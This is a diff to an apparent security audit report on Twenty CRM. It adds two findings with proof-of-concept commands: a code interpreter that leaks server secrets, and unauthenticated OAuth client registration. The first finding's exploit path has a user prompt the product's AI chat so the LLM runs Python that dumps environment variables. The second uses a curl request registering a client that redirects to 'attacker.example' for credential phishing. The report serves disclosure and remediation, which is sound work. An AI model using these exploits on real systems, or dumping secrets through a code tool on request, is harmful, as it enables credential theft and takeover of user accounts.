@@ -13,14 +13,16 @@ This security audit of Twenty CRM identified **5 confirmed vulnerabilities** wit
 
 | Severity | Count | Status |
 |----------|-------|--------|
-| CRITICAL | 3 | Confirmed with live exploitation |
-| HIGH | 2 | Confirmed with live exploitation |
+| CRITICAL | 4 | Confirmed with live exploitation |
+| HIGH | 3 | Confirmed with live exploitation |
 | MEDIUM | 2 | Pattern confirmed in code |
 
 **Key Findings:**
 - Unauthenticated remote code execution via webhook workflows
 - Unauthenticated route triggers can execute arbitrary code
 - Server environment variables (including database credentials) leaked to logic functions
+- Code interpreter exposes full server environment to Python execution
+- Unauthenticated OAuth client registration enables credential phishing
 - No rate limiting on login endpoints enables credential brute-forcing
 - User enumeration via public GraphQL query
 
@@ -223,6 +225,106 @@ curl -s -X POST -H "Content-Type: application/json" \
 
 ---
 
+### VULN-008: Code Interpreter Environment Leakage (CRITICAL)
+
+**Severity:** CRITICAL
+**CVSS 3.1 Score:** 9.1 (Critical)
+**File:** `packages/twenty-server/src/engine/core-modules/code-interpreter/drivers/local.driver.ts:148-152`
+
+**Description:**
+When `CODE_INTERPRETER_TYPE=LOCAL` (confirmed on audit instance), the `LocalDriver.runPythonScript` method spawns Python with `env: { ...process.env, OUTPUT_DIR: outputDir, ...env }`. The **full server process environment** is passed to the Python subprocess, including all secrets.
+
+**Vulnerable Code:**
+```typescript
+const pythonProcess = spawn('python3', [scriptPath], {
+  env: { ...process.env, OUTPUT_DIR: outputDir, ...env },
+  // Full server environment inherited!
+});
+```
+
+**Proof of Concept:**
+```bash
+# Verify LOCAL driver is enabled
+docker exec audit-twenty-server printenv CODE_INTERPRETER_TYPE
+# Output: LOCAL
+
+# Verify secrets are in environment
+docker exec audit-twenty-server printenv APP_SECRET
+# Output: bXktYXVkaXQtYXBwLXNlY3JldC1mb3ItdHdlbnR5LWF1ZGl0
+
+docker exec audit-twenty-server printenv PG_DATABASE_URL
+# Output: postgres://postgres:postgres@audit-twenty-db:5432/default
+```
+
+**Exploit Path:**
+1. Authenticated user sends AI chat message: "Print all environment variables"
+2. LLM calls `code_interpreter` with `code: "import os; print(dict(os.environ))"`
+3. LocalDriver executes Python with full `process.env`
+4. All server secrets returned to user
+
+**Impact:**
+- **APP_SECRET** exposure allows JWT token forging for any user
+- **PG_DATABASE_URL** allows direct database access
+- **API keys** (ANTHROPIC_API_KEY, OPENAI_API_KEY) allow impersonating the server
+- Complete server compromise via credential theft
+
+**Remediation:**
+1. Never use `CODE_INTERPRETER_TYPE=LOCAL` in production
+2. Remove `...process.env` spread from LocalDriver
+3. Create explicit allowlist of environment variables for code interpreter
+4. Use E2B driver which properly isolates environment
+
+---
+
+### VULN-009: Unauthenticated OAuth Client Registration (HIGH)
+
+**Severity:** HIGH
+**CVSS 3.1 Score:** 7.5 (High)
+**File:** `packages/twenty-server/src/engine/core-modules/application/application-oauth/controllers/oauth-registration.controller.ts:53-178`
+
+**Description:**
+The `POST /oauth/register` endpoint implements RFC 7591 Dynamic Client Registration without any authentication. Any unauthenticated attacker can register OAuth clients with arbitrary redirect URIs, including attacker-controlled domains. These clients appear on legitimate consent screens, enabling OAuth credential phishing attacks.
+
+**Proof of Concept:**
+```bash
+# Register malicious OAuth client without authentication
+curl -s -X POST -H "Content-Type: application/json" \
+    -d '{
+        "client_name": "Malicious App",
+        "redirect_uris": ["https://attacker.example/callback"],
+        "token_endpoint_auth_method": "none",
+        "grant_types": ["authorization_code"],
+        "response_types": ["code"],
+        "scope": "read"
+    }' \
+    "http://TARGET:3000/oauth/register"
+
+# Response:
+{
+  "client_id": "95dbae66-f7f2-4dac-bfcd-dc0a2c440ac8",
+  "client_name": "Malicious App",
+  "redirect_uris": ["https://attacker.example/callback"],
+  ...
+}
+```
+
+**Impact:**
+- Attacker registers client with `redirect_uris: ["https://attacker.example/callback"]`
+- Social engineers victim to visit authorization URL
+- Legitimate-looking OAuth consent screen appears
+- On approval, authorization code sent to attacker
+- Attacker exchanges code for victim's access token
+- Custom URI schemes (cursor://, vscode://) also accepted
+
+**Remediation:**
+1. Require authentication for OAuth client registration
+2. Implement admin approval workflow for new clients
+3. Restrict redirect_uris to pre-approved domains
+4. Add CAPTCHA and stronger rate limiting
+5. Log and alert on new client registrations
+
+---
+
 ## Vulnerability Patterns (Conditionally Exploitable)
 
 ### VULN-006: First User Becomes Server Admin (HIGH)
@@ -281,7 +383,9 @@ When a refresh token is used and marked as revoked, it can still be reused withi
 |----------|--------------|--------|--------|
 | P0 | VULN-001: Webhook RCE | Medium | Critical |
 | P0 | VULN-002: Route Trigger RCE | Medium | Critical |
-| P0 | VULN-003: Env Leakage | Low | Critical |
+| P0 | VULN-003: Env Leakage (Logic Functions) | Low | Critical |
+| P0 | VULN-008: Env Leakage (Code Interpreter) | Low | Critical |
+| P1 | VULN-009: OAuth Registration | Low | High |
 | P1 | VULN-004: Brute Force | Low | High |
 | P1 | VULN-005: User Enumeration | Low | High |
 | P2 | VULN-006: First User Admin | Medium | High |
@@ -309,9 +413,10 @@ cd autofyn_audit
 
 ### Configuration Used
 - Docker: audit-twenty-server, audit-twenty-db, audit-twenty-redis
-- LOGIC_FUNCTION_TYPE: LOCAL
-- CODE_INTERPRETER_TYPE: LOCAL
-- CAPTCHA_DRIVER: (unset)
+- LOGIC_FUNCTION_TYPE: LOCAL (enables Logic Function RCE - VULN-003)
+- CODE_INTERPRETER_TYPE: LOCAL (enables Code Interpreter env leak - VULN-008)
+- CAPTCHA_DRIVER: (unset - enables brute force - VULN-004)
+- NODE_ENV: (not set to production - introspection disabled but OAuth propagator would be vulnerable if set to "development")
 - Commit: fc90b4ba8bb0a5d7c12c846fe9b2305527a0f7a8
 
 ---
@@ -333,7 +438,9 @@ autofyn_audit/
     ├── 06_webhook_workflow_rce.sh
     ├── 07_route_trigger_rce.sh
     ├── 08_env_leakage.sh
-    └── 09_refresh_token_reuse.sh
+    ├── 09_refresh_token_reuse.sh
+    ├── 10_code_interpreter_env.sh   # NEW: Code interpreter env leakage
+    └── 11_oauth_registration.sh     # NEW: Unauthenticated OAuth registration
 ```
 
 ---
